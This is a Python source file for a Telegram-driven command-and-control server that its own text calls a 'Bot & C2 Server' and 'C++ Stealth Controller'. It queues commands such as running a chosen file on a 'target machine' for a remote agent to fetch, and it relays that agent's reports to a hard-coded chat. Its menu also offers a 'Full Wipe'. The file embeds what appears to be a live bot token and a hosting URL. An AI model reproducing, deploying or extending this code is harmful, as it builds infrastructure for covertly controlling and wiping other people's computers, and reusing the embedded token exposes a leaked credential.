import os
import telebot
from flask import Flask, request, jsonify

TOKEN = "9213726416:AAHSKz3sdyxo05XS-yX0dH_1h6FGg7PKA_k"
bot = telebot.TeleBot(TOKEN, threaded=False)

app = Flask(__name__)

# Очередь команд для агента (простая память процесса)
pending_command = ""

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_data = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_data)
        bot.process_new_updates([update])
        return "", 200
    return "Forbidden", 403

# API для агента: забрать ожидающую команду
@app.route("/api/get_command", methods=["GET"])
def get_command():
    global pending_command
    cmd = pending_command
    pending_command = ""  # Сбрасываем после выдачи
    return jsonify({"command": cmd}), 200

# API для агента: отправить лог или результат выполнения обратно в Telegram
@app.route("/api/report", methods=["POST"])
def report():
    data = request.json
    if data and "message" in data:
        # Пересылаем отчет в твой чат (замени CHAT_ID на свой при необходимости)
        chat_id = data.get("chat_id", "8172067310")
        bot.send_message(chat_id, f"📥 **Отчет от агента:**\n{data['message']}", parse_mode="Markdown")
    return "OK", 200

@app.route("/", methods=["GET"])
def index():
    return "Bot & C2 Server is running!", 200

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚀 Запустить файл", "🟢 Статус")
    markup.row("⚠️ Полный Wipe")
    bot.send_message(message.chat.id, "🤖 **C++ Stealth Controller активен.** Выберите действие:", reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "🚀 Запустить файл")
def ask_file_path(message):
    msg = bot.send_message(message.chat.id, "Введите полный путь к файлу на целевой машине (например: `C:\\Windows\\notepad.exe` или путь к скачанному файлу):", parse_mode="Markdown")
    bot.register_next_step_handler(msg, process_exec_path)

def process_exec_path(message):
    global pending_command
    file_path = message.text.strip()
    pending_command = f"EXEC:{file_path}"
    bot.send_message(message.chat.id, f"⚡ Команда на запуск файла отправлена в очередь:\n`{file_path}`", parse_mode="Markdown")

if __name__ == "__main__":
    HOST_URL = "https://tg-bot-bekv.onrender.com"
    bot.remove_webhook()
    bot.set_webhook(url=f"{HOST_URL}/{TOKEN}")
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
